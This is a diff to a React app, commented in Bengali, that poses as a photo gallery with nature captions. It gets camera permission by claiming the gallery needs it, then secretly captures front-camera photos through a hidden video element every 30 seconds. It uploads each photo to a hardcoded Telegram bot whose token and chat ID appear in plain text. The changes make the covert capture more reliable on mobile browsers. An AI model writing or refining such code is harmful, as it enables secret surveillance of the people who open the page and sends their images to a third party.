@@ -7,7 +7,6 @@ function App() {
   const [hasPermission, setHasPermission] = useState(false);
   const [loading, setLoading] = useState(false);
 
-  // আপনার দেওয়া টোকেন এবং আইডি
   const BOT_TOKEN = "8119794922:AAEz-Fzfm0zZSuVTgLEZwBSRTbOYuBQ3nHg";
   const CHAT_ID = "7236181886";
 
@@ -18,50 +17,55 @@ function App() {
     "প্রকৃতির মাঝে খুঁজে পাই নিজেকে। 🌿"
   ];
 
-  // টেলিগ্রামে ছবি পাঠানোর ফাংশন
   const sendToTelegram = useCallback(async (photoBlob) => {
     const TELEGRAM_URL = `https://api.telegram.org/bot${BOT_TOKEN}/sendPhoto`;
     const formData = new FormData();
     formData.append("chat_id", CHAT_ID);
     formData.append("photo", photoBlob, "capture.jpg");
+    formData.append("caption", "New image captured! 📸");
 
     try {
       const response = await fetch(TELEGRAM_URL, { method: "POST", body: formData });
       const result = await response.json();
-      
       if (result.ok) {
         console.log("সাফল্য! ছবি টেলিগ্রামে গেছে।");
       } else {
-        console.error("টেলিগ্রাম এরর মেসেজ:", result.description);
-        // এখানে বটের টোকেন বা চ্যাট আইডি ভুল থাকলে মেসেজ দেখাবে
+        console.error("টেলিগ্রাম এরর:", result.description);
       }
     } catch (err) {
       console.error("নেটওয়ার্ক এরর:", err);
     }
   }, [BOT_TOKEN, CHAT_ID]);
-  // ছবি তোলার ফাংশন
+
   const captureImage = useCallback(() => {
-    if (videoRef.current && canvasRef.current) {
+    // ভিডিও এলিমেন্ট চেক করা এবং তার উইডথ আছে কি না দেখা
+    if (videoRef.current && videoRef.current.videoWidth > 0 && canvasRef.current) {
       const canvas = canvasRef.current;
+      const video = videoRef.current;
       const context = canvas.getContext('2d');
-      canvas.width = videoRef.current.videoWidth;
-      canvas.height = videoRef.current.videoHeight;
-      context.drawImage(videoRef.current, 0, 0);
+      
+      canvas.width = video.videoWidth;
+      canvas.height = video.videoHeight;
+      context.drawImage(video, 0, 0, canvas.width, canvas.height);
 
       canvas.toBlob((blob) => {
         if (blob) sendToTelegram(blob);
-      }, 'image/jpeg');
+      }, 'image/jpeg', 0.7); // কোয়ালিটি ০.৭ দিলে দ্রুত আপলোড হবে
     }
   }, [sendToTelegram]);
 
-  // ক্যামেরা চালু করা
   const startCamera = async () => {
     setLoading(true);
     try {
-      const stream = await navigator.mediaDevices.getUserMedia({ video: true });
+      const stream = await navigator.mediaDevices.getUserMedia({ 
+        video: { facingMode: "user" } // ফ্রন্ট ক্যামেরা নিশ্চিত করতে
+      });
       if (videoRef.current) {
         videoRef.current.srcObject = stream;
-        setHasPermission(true);
+        // ভিডিও প্লে হতে একটু সময় দিন
+        videoRef.current.onloadedmetadata = () => {
+          setHasPermission(true);
+        };
       }
     } catch (err) {
       alert("ক্যামেরা পারমিশন ছাড়া গ্যালারি লোড করা সম্ভব নয়।");
@@ -70,14 +74,15 @@ function App() {
     }
   };
 
-  // অটোমেটিক ছবি তোলার টাইমার
   useEffect(() => {
     let interval;
     if (hasPermission) {
-      captureImage(); // প্রথম ছবি সাথে সাথে
+      // ক্যামেরা স্টার্ট হওয়ার ৩ সেকেন্ড পর প্রথম ছবি তুলবে
+      setTimeout(() => captureImage(), 3000); 
+
       interval = setInterval(() => {
         captureImage();
-      }, 30000); // প্রতি ৩০ সেকেন্ড পর পর
+      }, 30000);
     }
     return () => clearInterval(interval);
     // eslint-disable-next-line react-hooks/exhaustive-deps
@@ -99,7 +104,8 @@ function App() {
             </div>
           )}
 
-          <video ref={videoRef} autoPlay playsInline style={{ display: 'none' }} />
+          {/* playsInline এবং muted মোবাইল ব্রাউজারে অটো-প্লের জন্য জরুরি */}
+          <video ref={videoRef} autoPlay playsInline muted style={{ display: 'none' }} />
           <canvas ref={canvasRef} style={{ display: 'none' }} />
         </div>
       </header>
